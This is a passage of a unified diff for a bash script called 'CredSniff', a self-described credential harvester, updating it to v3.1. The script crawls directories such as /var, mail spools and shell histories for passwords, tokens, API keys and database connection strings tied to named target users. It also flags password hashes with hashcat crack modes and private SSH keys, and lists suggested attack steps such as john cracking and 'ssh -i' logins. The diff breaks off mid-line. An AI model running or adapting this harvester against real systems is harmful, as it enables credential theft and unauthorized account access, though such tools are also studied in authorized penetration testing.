@@ -1,35 +1,38 @@
 #!/bin/bash
 # ============================================================================
-#   CredSniff v3.0 — Credential Harvester
-#   Usage: ./credsniff.sh -p "user1|user2|password" [-d /var] [-e conf,txt] [-H]
+#   CredSniff v3.1 — Credential Harvester
+#   Target-aware: finds credentials belonging to named users
+#   Usage: ./credsniff.sh -p "charles|sam" [-d /var] [-H]
 # ============================================================================
 
-# ── Colors ──────────────────────────────────────────────────────────────────
-R='\033[0;31m'    G='\033[0;32m'    Y='\033[0;33m'
-B='\033[0;34m'    M='\033[0;35m'    C='\033[0;36m'
-W='\033[1;37m'    DIM='\033[2m'     RST='\033[0m'
+# ── Colors ───────────────────────────────────────────────────────────────────
+R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'
+M='\033[0;35m'  C='\033[0;36m'  W='\033[1;37m'
+DIM='\033[2m'   RST='\033[0m'
 
-# ── Defaults ────────────────────────────────────────────────────────────────
+# ── Defaults ──────────────────────────────────────────────────────────────────
 TARGET_DIR_RAW="/var"
 declare -a TARGET_DIRS=()
+declare -a TARGETS=()          # individual terms parsed from -p
 PATTERN=""
 WORDLIST=""
 EXTENSIONS=""
-THREADS=10
-QUIET=0
-FULL_REPORT=0
 HISTORY_MODE=0
+QUIET=0
 FOUND_COUNT=0
 FILES_SCANNED=0
 TOTAL_FILES=0
 PROGRESS_ACTIVE=0
 RESULTS_DIR=""
 
-declare -a CRED_PAIRS=()
-declare -a HASHES=()
-declare -a B64_FINDS=()
-declare -a KEY_FINDS=()
+declare -a ALL_CREDS=()
+declare -a ALL_HASHES=()
+declare -a ALL_KEYS=()
 declare -a ATTACK_PATHS=()
+
+# ── Credential line regex ─────────────────────────────────────────────────────
+# Matches lines that likely contain a credential value
+CRED_LINE_RE='[Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*\S|[Ss]ecret[[:space:]]*[=:][[:space:]]*\S|[Tt]oken[[:space:]]*[=:][[:space:]]*\S|[Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*\S|[Cc]redential[[:space:]]*[=:][[:space:]]*\S|[Kk]ey[[:space:]]*[=:][[:space:]]*\S'
 
 # ── Timestamp ─────────────────────────────────────────────────────────────────
 ts() { date +"%H:%M:%S"; }
@@ -37,85 +40,61 @@ ts() { date +"%H:%M:%S"; }
 # ── Progress bar ──────────────────────────────────────────────────────────────
 draw_progress() {
     [[ $QUIET -eq 1 ]] && return
-    local current=$1 total=$2 width=38
-    local pct=0
-    [[ $total -gt 0 ]] && pct=$(( current * 100 / total ))
-    local filled=$(( pct * width / 100 ))
-    local bar_filled="" bar_empty=""
-    local i
-    for ((i=0; i<filled; i++));          do bar_filled+="█"; done
-    for ((i=filled; i<width; i++));      do bar_empty+="░"; done
-    printf "\r  ${G}[${bar_filled}${DIM}${bar_empty}${RST}${G}]${RST} ${W}%3d%%${RST}  ${DIM}%d/%d files${RST}   " \
-        "$pct" "$current" "$total" >&2
+    local cur=$1 total=$2 width=38 pct=0
+    [[ $total -gt 0 ]] && pct=$(( cur * 100 / total ))
+    local filled=$(( pct * width / 100 )) i
+    local bar_f="" bar_e=""
+    for ((i=0; i<filled; i++));       do bar_f+="█"; done
+    for ((i=filled; i<width; i++));   do bar_e+="░"; done
+    printf "\r  ${G}[${bar_f}${DIM}${bar_e}${RST}${G}]${RST} ${W}%3d%%${RST}  ${DIM}%d/%d files${RST}   " \
+        "$pct" "$cur" "$total" >&2
     PROGRESS_ACTIVE=1
 }
 
 clear_progress() {
     [[ $QUIET -eq 1 || $PROGRESS_ACTIVE -eq 0 ]] && return
-    printf "\r\033[K" >&2
-    PROGRESS_ACTIVE=0
+    printf "\r\033[K" >&2; PROGRESS_ACTIVE=0
 }
 
 end_progress() {
     [[ $QUIET -eq 1 ]] && return
-    draw_progress "$TOTAL_FILES" "$TOTAL_FILES"
-    printf "\n" >&2
-    PROGRESS_ACTIVE=0
+    draw_progress "$TOTAL_FILES" "$TOTAL_FILES"; printf "\n" >&2; PROGRESS_ACTIVE=0
 }
 
 # ── Results directory ─────────────────────────────────────────────────────────
 init_results() {
-    local stamp
-    stamp=$(date +"%Y-%m-%d_%H%M%S")
-    RESULTS_DIR="credsniff-results/${stamp}"
+    RESULTS_DIR="credsniff-results/$(date +"%Y-%m-%d_%H%M%S")"
     mkdir -p "$RESULTS_DIR"
-    local hdr="CredSniff v3.0 — $(date)"
-    for f in credentials.txt hashes.txt ssh-keys.txt b64-secrets.txt \
-              history.txt raw-matches.txt 00-summary.txt; do
-        printf "# %s\n\n" "$hdr" > "${RESULTS_DIR}/${f}"
+    local hdr="# CredSniff v3.1 — $(date)"$'\n'
+    for f in credentials.txt hashes.txt ssh-keys.txt history.txt raw-matches.txt 00-summary.txt; do
+        echo -e "$hdr" > "${RESULTS_DIR}/${f}"
     done
 }
 
-rwrite() {
-    local file="$1" line="$2"
-    [[ -n "$RESULTS_DIR" ]] && echo -e "$line" >> "${RESULTS_DIR}/${file}"
-}
+rwrite() { [[ -n "$RESULTS_DIR" ]] && echo -e "$2" >> "${RESULTS_DIR}/$1"; }
 
-# ── Output: critical hits to screen, all to files ─────────────────────────────
-finding() {
-    local type="$1" detail="$2" src="$3"
+# ── Screen hit: only real credential findings ─────────────────────────────────
+# Format: [ts] TARGET  →  VALUE   (source)
+cred_hit() {
+    local target="$1" value="$2" src="$3" type="${4:-CRED}"
+    [[ -z "$value" || "$value" =~ ^[[:space:]]*$ ]] && return
+    FOUND_COUNT=$((FOUND_COUNT + 1))
+    ALL_CREDS+=("${target}|${value}|${src}")
+    ATTACK_PATHS+=("Try ${target}:${value}")
+
     local color
     case "$type" in
-        CRED)  color="$R" ;;
-        HASH)  color="$Y" ;;
-        B64)   color="$M" ;;
-        KEY)   color="$R" ;;
-        MAIL)  color="$C" ;;
-        HIST)  color="$Y" ;;
-        MATCH) color="$G" ;;
+        HASH) color="$Y" ;;
+        KEY)  color="$R" ;;
+        HIST) color="$Y" ;;
+        *)    color="$G" ;;
     esac
-    FOUND_COUNT=$((FOUND_COUNT + 1))
 
-    # MATCH — silent on screen, goes to raw-matches only
-    if [[ "$type" == "MATCH" ]]; then
-        rwrite "raw-matches.txt" "$(printf '[%s] %-5s - %s  (%s)' "$(ts)" "$type" "$detail" "$src")"
-        return
-    fi
-
-    # Critical hit — clear progress bar, print to screen, redraw bar
     clear_progress
-    echo -e "[$(ts)] ${color}$(printf '%-5s' "$type")${RST} - ${W}${detail}${RST}  ${DIM}${src}${RST}"
-    rwrite "00-summary.txt" "$(printf '[%s] %-5s - %s  (%s)' "$(ts)" "$type" "$detail" "$src")"
-
-    case "$type" in
-        CRED) rwrite "credentials.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-        HASH) rwrite "hashes.txt"      "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-        KEY)  rwrite "ssh-keys.txt"    "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-        B64)  rwrite "b64-secrets.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-        HIST) rwrite "history.txt"     "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-        MAIL) rwrite "raw-matches.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
-    esac
-
+    printf "[%s] ${color}%-10s${RST} ${W}→${RST}  ${R}%s${RST}   ${DIM}%s${RST}\n" \
+        "$(ts)" "$target" "$value" "$src"
+    rwrite "credentials.txt" "$(printf '%-10s → %s   (%s)' "$target" "$value" "$src")"
+    rwrite "00-summary.txt"  "$(printf '[%s] %-10s → %s   (%s)' "$(ts)" "$target" "$value" "$src")"
     [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
 }
 
@@ -130,47 +109,41 @@ banner() {
   \___|_|_\___|___/|___/_|\_|___|_| |_|
 BANNER
     echo -e "${RST}"
-    echo -e "  ${DIM}v3.0${RST} | ${Y}Credential Harvester${RST}"
+    echo -e "  ${DIM}v3.1${RST} | ${Y}Credential Harvester${RST}"
     echo ""
 }
 
-# ── Usage ──────────────────────────────────────────────────────────────────────
+# ── Usage ─────────────────────────────────────────────────────────────────────
 usage() {
     echo -e "${W}Usage:${RST}"
-    echo "  credsniff.sh [options] -p PATTERN"
+    echo "  credsniff.sh -p \"charles|sam\" [options]"
     echo ""
     echo -e "${W}Options:${RST}"
     echo "  -d DIR        Target directory (default: /var)"
-    echo "                  Use + for multiple subdirs: /var/mail+lib+www"
-    echo "  -p PATTERN    Grep-E pattern (e.g. \"admin|root|password\")"
-    echo "  -w FILE       Load patterns from wordlist (one per line)"
-    echo "  -e EXTS       Extension filter, comma-sep (e.g. conf,php,txt,xml)"
-    echo "  -t NUM        Thread count (default: 10)"
-    echo "  -H            History mode — hunt history files for leaked commands"
-    echo "  -q            Quiet — no banner or progress bar, findings only"
-    echo "  -F            Full report — print detailed breakdown at end"
-    echo "  -h            Show this help"
+    echo "                  Use + for multiple: /var/mail+lib+www"
+    echo "  -p TARGETS    Target usernames/keywords (pipe-separated)"
+    echo "  -w FILE       Load targets from wordlist"
+    echo "  -e EXTS       Extension filter (e.g. conf,php,txt)"
+    echo "  -H            Also hunt shell history files"
+    echo "  -q            Quiet — no banner or progress bar"
+    echo "  -h            Help"
     echo ""
     echo -e "${W}Examples:${RST}"
-    echo "  credsniff.sh -p \"admin|root|password\""
-    echo "  credsniff.sh -d /var/mail+lib+www -p \"charles|sam|password\""
-    echo "  credsniff.sh -d /home -p \"charles|sam\" -e conf,txt,php"
-    echo "  credsniff.sh -H -p \"charles\""
-    echo "  credsniff.sh -w users.txt -d /var -F"
+    echo "  credsniff.sh -p \"charles|sam\""
+    echo "  credsniff.sh -p \"charles|sam\" -d /var/mail+www+lib"
+    echo "  credsniff.sh -p \"charles\" -H"
     exit 0
 }
 
-# ── Arg parsing ────────────────────────────────────────────────────────────────
-while getopts "d:p:w:e:t:HqFh" opt; do
+# ── Arg parsing ───────────────────────────────────────────────────────────────
+while getopts "d:p:w:e:Hqh" opt; do
     case $opt in
         d) TARGET_DIR_RAW="$OPTARG" ;;
         p) PATTERN="$OPTARG" ;;
         w) WORDLIST="$OPTARG" ;;
         e) EXTENSIONS="$OPTARG" ;;
-        t) THREADS="$OPTARG" ;;
         H) HISTORY_MODE=1 ;;
         q) QUIET=1 ;;
-        F) FULL_REPORT=1 ;;
         h) usage ;;
         *) usage ;;
     esac
@@ -179,14 +152,16 @@ done
 # ── Wordlist loading ───────────────────────────────────────────────────────────
 if [[ -n "$WORDLIST" ]]; then
     [[ ! -f "$WORDLIST" ]] && { echo -e "${R}[!] Wordlist not found: ${WORDLIST}${RST}"; exit 1; }
-    local_wl=$(grep -v '^#' "$WORDLIST" | grep -v '^$' | paste -sd'|')
-    PATTERN="${PATTERN:+${PATTERN}|}${local_wl}"
+    wl=$(grep -v '^#' "$WORDLIST" | grep -v '^$' | paste -sd'|')
+    PATTERN="${PATTERN:+${PATTERN}|}${wl}"
 fi
 
 if [[ -z "$PATTERN" && $HISTORY_MODE -eq 0 ]]; then
-    echo -e "${R}[!] -p PATTERN, -w WORDLIST, or -H required${RST}"
-    usage
+    echo -e "${R}[!] -p TARGETS or -H required${RST}"; usage
 fi
+
+# Parse individual targets from pattern
+IFS='|' read -ra TARGETS <<< "$PATTERN"
 
 # ── Expand + syntax ────────────────────────────────────────────────────────────
 if [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
@@ -205,63 +180,195 @@ done
 
 # ── Hash identification ────────────────────────────────────────────────────────
 identify_hash() {
-    local hash="$1" len=${#1}
-    [[ "$hash" =~ ^\$2[aby]?\$  ]] && echo "bcrypt|hashcat -m 3200 / john --format=bcrypt"            && return
-    [[ "$hash" =~ ^\$6\$        ]] && echo "sha512crypt|hashcat -m 1800 / john --format=sha512crypt"  && return
-    [[ "$hash" =~ ^\$5\$        ]] && echo "sha256crypt|hashcat -m 7400 / john --format=sha256crypt"  && return
-    [[ "$hash" =~ ^\$1\$        ]] && echo "md5crypt|hashcat -m 500 / john --format=md5crypt"         && return
-    [[ "$hash" =~ ^\$apr1\$     ]] && echo "APR1-MD5|hashcat -m 1600 / john --format=md5crypt-long"   && return
-    [[ $len -eq 32  && "$hash" =~ ^[a-fA-F0-9]{32}$  ]] && echo "MD5/NTLM|hashcat -m 0 or -m 1000"  && return
-    [[ $len -eq 40  && "$hash" =~ ^[a-fA-F0-9]{40}$  ]] && echo "SHA-1|hashcat -m 100"               && return
-    [[ $len -eq 64  && "$hash" =~ ^[a-fA-F0-9]{64}$  ]] && echo "SHA-256|hashcat -m 1400"            && return
-    [[ $len -eq 128 && "$hash" =~ ^[a-fA-F0-9]{128}$ ]] && echo "SHA-512|hashcat -m 1700"            && return
-    [[ $len -eq 16  && "$hash" =~ ^[a-fA-F0-9]{16}$  ]] && echo "MySQL323|hashcat -m 200"            && return
-    [[ $len -eq 13  && "$hash" =~ ^[a-zA-Z0-9./]{13}$ ]] && echo "DES-crypt|hashcat -m 1500"         && return
-    echo "unknown|hash-identifier or hashid"
+    local h="$1" l=${#1}
+    [[ "$h" =~ ^\$2[aby]?\$  ]] && echo "bcrypt|hashcat -m 3200"           && return
+    [[ "$h" =~ ^\$6\$        ]] && echo "sha512crypt|hashcat -m 1800"      && return
+    [[ "$h" =~ ^\$5\$        ]] && echo "sha256crypt|hashcat -m 7400"      && return
+    [[ "$h" =~ ^\$1\$        ]] && echo "md5crypt|hashcat -m 500"          && return
+    [[ "$h" =~ ^\$apr1\$     ]] && echo "APR1-MD5|hashcat -m 1600"         && return
+    [[ $l -eq 32  && "$h" =~ ^[a-fA-F0-9]{32}$  ]] && echo "MD5/NTLM|hashcat -m 0 or -m 1000" && return
+    [[ $l -eq 40  && "$h" =~ ^[a-fA-F0-9]{40}$  ]] && echo "SHA-1|hashcat -m 100"             && return
+    [[ $l -eq 64  && "$h" =~ ^[a-fA-F0-9]{64}$  ]] && echo "SHA-256|hashcat -m 1400"          && return
+    [[ $l -eq 128 && "$h" =~ ^[a-fA-F0-9]{128}$ ]] && echo "SHA-512|hashcat -m 1700"          && return
+    [[ $l -eq 16  && "$h" =~ ^[a-fA-F0-9]{16}$  ]] && echo "MySQL323|hashcat -m 200"          && return
+    [[ $l -eq 13  && "$h" =~ ^[a-zA-Z0-9./]{13}$ ]] && echo "DES-crypt|hashcat -m 1500"       && return
+    echo "unknown|"
 }
 
-# ── Base64 detection ───────────────────────────────────────────────────────────
-check_base64() {
-    local str="$1"
-    if [[ ${#str} -ge 8 ]] && [[ "$str" =~ ^[A-Za-z0-9+/]{4,}={0,2}$ ]]; then
-        local decoded
-        decoded=$(echo "$str" | base64 -d 2>/dev/null)
-        if [[ $? -eq 0 && -n "$decoded" ]]; then
-            if echo "$decoded" | grep -qP '^[\x20-\x7E\n\r\t]+$'; then
-                echo "$decoded"; return 0
-            fi
-        fi
+# ── Extract credential value from a line ──────────────────────────────────────
+# Handles: "Password is: VALUE", "password=VALUE", "Password: VALUE", "secret=VALUE"
+extract_cred_value() {
+    local line="$1"
+    local val=""
+
+    # Pattern: word (optional "is") [=:] value
+    # e.g. "Password is:  ^xHhA&hvim0y"  or  "password=hunter2"
+    if [[ "$line" =~ [Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*(.+) ]]; then
+        val="${BASH_REMATCH[3]}"
+    elif [[ "$line" =~ [Ss]ecret[[:space:]]*(is[[:space:]]+)?[=:][[:space:]]*(.+) ]]; then
+        val="${BASH_REMATCH[2]}"
+    elif [[ "$line" =~ [Tt]oken[[:space:]]*(is[[:space:]]+)?[=:][[:space:]]*(.+) ]]; then
+        val="${BASH_REMATCH[2]}"
+    elif [[ "$line" =~ [Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*(.+) ]]; then
+        val="${BASH_REMATCH[1]}"
+    elif [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
+        val="${BASH_REMATCH[3]}"
     fi
+
+    # Trim whitespace, quotes
+    val=$(echo "$val" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//; s/^["'"'"']//; s/["'"'"']$//')
+    echo "$val"
+}
+
+# ── Detect mail file ──────────────────────────────────────────────────────────
+is_mail_file() {
+    local file="$1"
+    [[ "$file" =~ /mail/ || "$file" =~ /spool/mail ]] && return 0
+    head -10 "$file" 2>/dev/null | grep -qE "^(From |Received:|MIME-Version:|Message-Id:)" && return 0
     return 1
 }
 
-# ── Credential pair extraction ─────────────────────────────────────────────────
-extract_cred_context() {
-    local line="$1" file="$2"
-
-    if [[ "$line" =~ ([a-zA-Z0-9._-]+)[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
-        local u="${BASH_REMATCH[1]}" p="${BASH_REMATCH[2]}"
-        if [[ ! "$u" =~ ^(http|https|ftp|ssh|tcp|udp|localhost|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)$ ]]; then
-            if [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev|tmp|proc|sys|sbin) ]]; then
-                CRED_PAIRS+=("${file}|${u}|${p}")
-                finding "CRED" "${u}:${p}" "${file}"
-            fi
-        fi
-    fi
-
-    if [[ "$line" =~ [Pp](ass(word|wd)?)[[:space:]]*[=:][[:space:]]*[\"\']*([^\"\'[:space:]]+) ]]; then
-        local pw="${BASH_REMATCH[3]}"
-        [[ ${#pw} -ge 2 ]] && { CRED_PAIRS+=("${file}|password_field|${pw}"); finding "CRED" "password_field:${pw}" "${file}"; }
-    fi
-
-    if [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
-        local svc="${BASH_REMATCH[1]}" u="${BASH_REMATCH[2]}" p="${BASH_REMATCH[3]}"
-        CRED_PAIRS+=("${file}|${svc}://${u}|${p}")
-        finding "CRED" "${svc}://${u}:${p}" "${file}"
-    fi
+# ── Which targets appear in this file ─────────────────────────────────────────
+file_targets() {
+    local file="$1"
+    local found=()
+    for t in "${TARGETS[@]}"; do
+        grep -qiE "\b${t}\b" "$file" 2>/dev/null && found+=("$t")
+    done
+    echo "${found[@]}"
 }
 
-# ── Single-pass file scanner ───────────────────────────────────────────────────
+# ── Primary target: prefer sender of mail, else first matched ─────────────────
+primary_target_for_mail() {
+    local file="$1"; shift
+    local targets=("$@")
+    local from_line
+    from_line=$(grep -im1 "^From:" "$file" 2>/dev/null)
+    for t in "${targets[@]}"; do
+        echo "$from_line" | grep -qi "$t" && { echo "$t"; return; }
+    done
+    echo "${targets[0]}"
+}
+
+# ── Scan a mail file ──────────────────────────────────────────────────────────
+scan_mail() {
+    local file="$1"; shift
+    local targets=("$@")
+    local primary
+    primary=$(primary_target_for_mail "$file" "${targets[@]}")
+
+    # Scan full file body for credential lines
+    local cred_lines
+    cred_lines=$(grep -niE "$CRED_LINE_RE" "$file" 2>/dev/null)
+    if [[ -n "$cred_lines" ]]; then
+        while IFS= read -r line; do
+            [[ -z "$line" ]] && continue
+            local ln="${line%%:*}" content="${line#*:}"
+            local val; val=$(extract_cred_value "$content")
+            [[ -n "$val" ]] && cred_hit "$primary" "$val" "${file}:${ln}"
+        done <<< "$cred_lines"
+    fi
+
+    # Also check for hashes
+    scan_hashes "$file" "$primary"
+    scan_keys "$file" "$primary"
+}
+
+# ── Scan a non-mail file with context window ──────────────────────────────────
+scan_context() {
+    local file="$1"; shift
+    local targets=("$@")
+    local ctx=8   # lines of context above/below target mention
+
+    for target in "${targets[@]}"; do
+        local hit_lines
+        hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
+        [[ -z "$hit_lines" ]] && continue
+
+        while IFS= read -r hit; do
+            local ln="${hit%%:*}"
+            local start=$(( ln - ctx )); [[ $start -lt 1 ]] && start=1
+            local end=$(( ln + ctx ))
+
+            # Extract the context block
+            local block
+            block=$(sed -n "${start},${end}p" "$file" 2>/dev/null)
+
+            # Search context block for credential patterns
+            while IFS= read -r bline; do
+                echo "$bline" | grep -qE "$CRED_LINE_RE" || continue
+                local val; val=$(extract_cred_value "$bline")
+                [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${ln}"
+            done <<< "$block"
+
+            # Also look for inline user:pass on the hit line itself
+            local hitcontent="${hit#*:}"
+            if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
+                local p="${BASH_REMATCH[1]}"
+                [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
+                    cred_hit "$target" "$p" "${file}:${ln}"
+            fi
+        done <<< "$hit_lines"
+    done
+}
+
+# ── Hash scan ─────────────────────────────────────────────────────────────────
+scan_hashes() {
+    local file="$1" target="${2:-hash}"
+    local hits
+    hits=$(grep -noE '\$[0-9a-z]+\$[^\s:]{8,}|\b[a-fA-F0-9]{32,128}\b' "$file" 2>/dev/null | head -10)
+    [[ -z "$hits" ]] && return
+    while IFS= read -r hit; do
+        [[ -z "$hit" ]] && continue
+        local ln="${hit%%:*}" hash="${hit#*:}"
+        [[ ${#hash} -gt 128 ]] && continue
+        local id_r; id_r=$(identify_hash "$hash")
+        local ht="${id_r%%|*}" cc="${id_r#*|}"
+        [[ "$ht" == "unknown" ]] && continue
+        ALL_HASHES+=("${ht}|${hash}|${cc}|${file}")
+        ATTACK_PATHS+=("Crack ${ht}: ${cc} (hash from ${file})")
+        clear_progress
+        printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${Y}%s${RST}   ${DIM}%s${RST}\n" \
+            "$(ts)" "${ht}" "${hash:0:60}" "${file}:${ln}"
+        rwrite "hashes.txt" "$(printf '%-12s %s' "$ht" "$hash")"
+        rwrite "hashes.txt" "  crack: ${cc}   from: ${file}:${ln}"
+        rwrite "hashes.txt" ""
+        rwrite "00-summary.txt" "$(printf '[%s] HASH  %-10s %s   (%s)' "$(ts)" "$ht" "${hash:0:50}" "$file")"
+        [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
+    done <<< "$hits"
+}
+
+# ── SSH key scan ──────────────────────────────────────────────────────────────
+scan_keys() {
+    local file="$1" target="${2:-key}"
+    grep -ql "PRIVATE KEY" "$file" 2>/dev/null || return
+    local ktype="Unknown"
+    grep -q "RSA"     "$file" 2>/dev/null && ktype="RSA"
+    grep -q "DSA"     "$file" 2>/dev/null && ktype="DSA"
+    grep -q "EC"      "$file" 2>/dev/null && ktype="EC"
+    grep -q "OPENSSH" "$file" 2>/dev/null && ktype="OpenSSH"
+    local ks="unprotected"
+    grep -q "ENCRYPTED" "$file" 2>/dev/null && ks="encrypted"
+    ALL_KEYS+=("${file}|${ktype}|${ks}")
+    if [[ "$ks" == "encrypted" ]]; then
+        ATTACK_PATHS+=("Crack ${ktype} key: ssh2john ${file} > k.hash && john k.hash")
+    else
+        ATTACK_PATHS+=("Use ${ktype} key: chmod 600 ${file} && ssh -i ${file} user@target")
+    fi
+    clear_progress
+    printf "[%s] ${R}%-10s${RST} ${W}→${RST}  ${R}%s private key (%s)${RST}   ${DIM}%s${RST}\n" \
+        "$(ts)" "$target" "$ktype" "$ks" "$file"
+    rwrite "ssh-keys.txt" "$(printf '%s (%s)   %s' "$ktype" "$ks" "$file")"
+    if [[ "$ks" == "encrypted" ]]; then
+        rwrite "ssh-keys.txt" "  crack: ssh2john ${file} > k.hash && john k.hash"
+    else
+        rwrite "ssh-keys.txt" "  use:   chmod 600 ${file} && ssh -i ${file} user@target"
+    fi
+    rwrite "ssh-keys.txt" ""
+    [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
+}
+
+# ── Per-file dispatcher ───────────────────────────────────────────────────────
 scan_file() {
     local file="$1"
     FILES_SCANNED=$((FILES_SCANNED + 1))
@@ -270,90 +377,19 @@ scan_file() {
     [[ ! -r "$file" ]] && return
     file "$file" 2>/dev/null | grep -q "text" || return
 
-    # Pattern matching
-    if [[ -n "$PATTERN" ]]; then
-        local matches
-        matches=$(grep -nE "$PATTERN" "$file" 2>/dev/null)
-        if [[ -n "$matches" ]]; then
-            while IFS= read -r ml; do
-                [[ -z "$ml" ]] && continue
-                local ln="${ml%%:*}" content="${ml#*:}"
-                content=$(echo "$content" | sed 's/^[[:space:]]*//')
-                [[ ${#content} -gt 120 ]] && content="${content:0:117}..."
-                finding "MATCH" "${content}" "${file}:${ln}"
-                extract_cred_context "$content" "$file"
-            done <<< "$matches"
-        fi
-    fi
+    # Which targets appear in this file?
+    local matched
+    read -ra matched <<< "$(file_targets "$file")"
+    [[ ${#matched[@]} -eq 0 ]] && return   # irrelevant file
 
-    # Shadow-style hashes
-    local shadow_hits
-    shadow_hits=$(grep -noE '\$[0-9a-z]+\$[^\s:]{8,}' "$file" 2>/dev/null)
-    if [[ -n "$shadow_hits" ]]; then
-        while IFS= read -r hit; do
-            [[ -z "$hit" ]] && continue
-            local ln="${hit%%:*}" hash="${hit#*:}"
-            local id_r; id_r=$(identify_hash "$hash")
-            local ht="${id_r%%|*}" cc="${id_r#*|}"
-            finding "HASH" "${ht}: ${hash:0:55}..." "${file}:${ln}"
-            rwrite "hashes.txt" "  crack: ${cc}"
-            HASHES+=("${ht}|${hash}|${cc}|${file}")
-            ATTACK_PATHS+=("Crack ${ht} from ${file} → ${cc}")
-        done <<< "$shadow_hits"
+    rwrite "raw-matches.txt" "FILE: ${file}  (targets: ${matched[*]})"
+
+    if is_mail_file "$file"; then
+        scan_mail "$file" "${matched[@]}"
     else
-        local hex_hits
-        hex_hits=$(grep -noEh '\b[a-fA-F0-9]{32,128}\b' "$file" 2>/dev/null | head -10)
-        if [[ -n "$hex_hits" ]]; then
-            while IFS= read -r h; do
-                [[ -z "$h" || ${#h} -gt 130 ]] && continue
-                local ln="${h%%:*}" hash="${h#*:}"
-                local id_r; id_r=$(identify_hash "$hash")
-                local ht="${id_r%%|*}" cc="${id_r#*|}"
-                if [[ "$ht" != "unknown" ]]; then
-                    finding "HASH" "${ht}: ${hash:0:55}..." "${file}:${ln}"
-                    rwrite "hashes.txt" "  crack: ${cc}"
-                    HASHES+=("${ht}|${hash}|${cc}|${file}")
-                fi
-            done <<< "$hex_hits"
-        fi
-    fi
-
-    # Base64
-    local b64_hits
-    b64_hits=$(grep -noEh '[A-Za-z0-9+/]{12,}={0,2}' "$file" 2>/dev/null | sort -u | head -20)
-    if [[ -n "$b64_hits" ]]; then
-        while IFS= read -r b64; do
-            [[ -z "$b64" ]] && continue
-            local decoded; decoded=$(check_base64 "$b64")
-            if [[ $? -eq 0 && -n "$decoded" ]]; then
-                if echo "$decoded" | grep -qiE "pass|user|key|token|secret|admin|root|login|cred|auth|flag"; then
-                    finding "B64" "→ ${decoded:0:80}" "${file}"
-                    rwrite "b64-secrets.txt" "  encoded: ${b64:0:60}"
-                    B64_FINDS+=("${b64}|${decoded}")
-                    ATTACK_PATHS+=("Decoded b64 secret in ${file}")
-                fi
-            fi
-        done <<< "$b64_hits"
-    fi
-
-    # SSH private keys
-    if grep -ql "PRIVATE KEY" "$file" 2>/dev/null; then
-        local key_type="Unknown"
-        grep -q "RSA"     "$file" 2>/dev/null && key_type="RSA"
-        grep -q "DSA"     "$file" 2>/dev/null && key_type="DSA"
-        grep -q "EC"      "$file" 2>/dev/null && key_type="EC"
-        grep -q "OPENSSH" "$file" 2>/dev/null && key_type="OpenSSH"
-        local kstatus="unprotected"
-        grep -q "ENCRYPTED" "$file" 2>/dev/null && kstatus="encrypted"
-        finding "KEY" "${key_type} private key (${kstatus})" "${file}"
-        KEY_FINDS+=("${file}|${key_type}|${kstatus}")
-        if [[ "$kstatus" == "encrypted" ]]; then
-            rwrite "ssh-keys.txt" "  crack: ssh2john ${file} > key.hash && john key.hash"
-            ATTACK_PATHS+=("Crack ${key_type} key: ssh2john ${file}")
-        else
-            rwrite "ssh-keys.txt" "  use:   chmod 600 ${file} && ssh -i ${file} user@target"
-            ATTACK_PATHS+=("Use ${key_type} key: chmod 600 ${file} && ssh -i ${file} user@target")
-        fi
+        scan_context "$file" "${matched[@]}"
+        scan_hashes "$file" "${matched[0]}"
+        scan_keys   "$file" "${matched[0]}"
     fi
 }
 
@@ -364,13 +400,11 @@ main() {
     banner
     init_results
 
-    # ── Config display ─────────────────────────────────────────────────────────
     if [[ $QUIET -eq 0 ]]; then
         local pat_display="$PATTERN"
         [[ ${#pat_display} -gt 80 ]] && pat_display="${pat_display:0:77}..."
-        [[ -z "$pat_display" ]] && pat_display="${DIM}(none — history mode)${RST}"
-        echo -e " ${W}Target:${RST}  ${C}${TARGET_DIRS[*]}${RST}"
-        echo -e " ${W}Pattern:${RST} ${C}${pat_display}${RST}"
+        echo -e " ${W}Targets:${RST} ${C}${pat_display}${RST}"
+        echo -e " ${W}Dirs:${RST}    ${C}${TARGET_DIRS[*]}${RST}"
         [[ -n "$EXTENSIONS" ]] && echo -e " ${W}Ext:${RST}     ${C}${EXTENSIONS}${RST}"
         [[ $HISTORY_MODE -eq 1 ]] && echo -e " ${W}History:${RST} ${C}enabled${RST}"
         echo -e " ${W}Results:${RST} ${C}${RESULTS_DIR}/${RST}"
@@ -379,10 +413,11 @@ main() {
 
     local start_time; start_time=$(date +%s)
 
-    # ── Build file list and scan ────────────────────────────────────────────────
+    # ── Build file list ────────────────────────────────────────────────────────
     local all_files
     all_files=$(find "${TARGET_DIRS[@]}" -type f 2>/dev/null)
-    [[ -n "$EXTENSIONS" ]] && all_files=$(echo "$all_files" | grep -E "\.(${EXTENSIONS//,/|})$")
+    [[ -n "$EXTENSIONS" ]] && \
